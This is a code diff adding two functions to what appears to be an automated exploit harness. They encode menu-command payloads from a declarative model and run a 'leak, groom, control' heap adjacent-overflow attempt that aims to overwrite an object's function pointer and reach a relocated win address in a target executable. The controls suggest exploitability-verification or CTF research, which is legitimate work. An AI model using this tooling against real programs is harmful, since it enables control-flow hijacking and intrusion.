@@ -151,6 +151,65 @@ def detonate_leak_groom(exe: str, plan: AdjacentOverflowPlan, spec: MenuSpec, *,
     return not neg
 
 
+def menuspec_from_opmodel(model: dict) -> MenuSpec:
+    """Build a MenuSpec from a DECLARATIVE op-model (no code eval -- air-gap/determinism safe), the
+    form an analyst supplies via params or op-model discovery fills in. Each of the four ops is a
+    dict of fields encoded in order:
+        {"prefix_hex": "41",        # literal bytes to emit first (e.g. the command byte 'A')
+         "size": "u32le"|"u64le"|"ascii"|"ascii_nl",   # emit the requested alloc size (alloc_buf)
+         "len":  "u32le"|...,       # emit len(data) (edit_buf)
+         "data": true,              # emit the raw overflow bytes (edit_buf)
+         "suffix_hex": "0a"}        # trailing bytes (e.g. a newline)
+    Only the fields present are emitted. alloc_obj / trigger are usually just a prefix (a command
+    byte / menu choice)."""
+    def enc_int(kind: str, v: int) -> bytes:
+        if kind == "u32le":
+            return struct.pack("<I", v & 0xFFFFFFFF)
+        if kind == "u64le":
+            return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
+        if kind == "ascii":
+            return str(v).encode()
+        if kind == "ascii_nl":
+            return str(v).encode() + b"\n"
+        raise ValueError(f"unknown int encoding {kind!r}")
+
+    def op(name: str, *, size: Optional[int] = None, length: Optional[int] = None,
+           data: Optional[bytes] = None) -> bytes:
+        f = model.get(name) or {}
+        out = bytes.fromhex(f["prefix_hex"]) if f.get("prefix_hex") else b""
+        if "size" in f and size is not None:
+            out += enc_int(f["size"], size)
+        if "len" in f and data is not None:
+            out += enc_int(f["len"], len(data))
+        if f.get("data") and data is not None:
+            out += data
+        if f.get("suffix_hex"):
+            out += bytes.fromhex(f["suffix_hex"])
+        return out
+
+    return MenuSpec(
+        alloc_buf=lambda sz: op("alloc_buf", size=sz),
+        alloc_obj=lambda: op("alloc_obj"),
+        edit_buf=lambda d: op("edit_buf", data=d),
+        trigger=lambda: op("trigger"),
+    )
+
+
+def try_leak_groom(exe: str, *, buf_request: int, win_off: int, target_bytes: bytes,
+                   opmodel: dict, obj_fptr_off: int = 0, argv: Optional[list] = None,
+                   timeout: float = 12.0) -> bool:
+    """One-call leak->groom->control attempt from a declarative op-model: plan the adjacent-overflow
+    groom, build the MenuSpec, and detonate through the PIE two-stage oracle. Returns True only on a
+    sound L3 (positive reaches the relocated win, negative control misses). Never raises."""
+    try:
+        plan = plan_adjacent_overflow(buf_request, 0, obj_fptr_off=obj_fptr_off)
+        spec = menuspec_from_opmodel(opmodel)
+        return detonate_leak_groom(exe, plan, spec, win_off=win_off, target_bytes=target_bytes,
+                                   argv=argv, timeout=timeout)
+    except Exception:                                        # noqa: BLE001
+        return False
+
+
 def detonate_adjacent_overflow(exe: str, plan: AdjacentOverflowPlan, spec: MenuSpec, *,
                                input_mode: str = "stdin", argv: Optional[list] = None,
                                timeout: float = 8.0) -> bool:
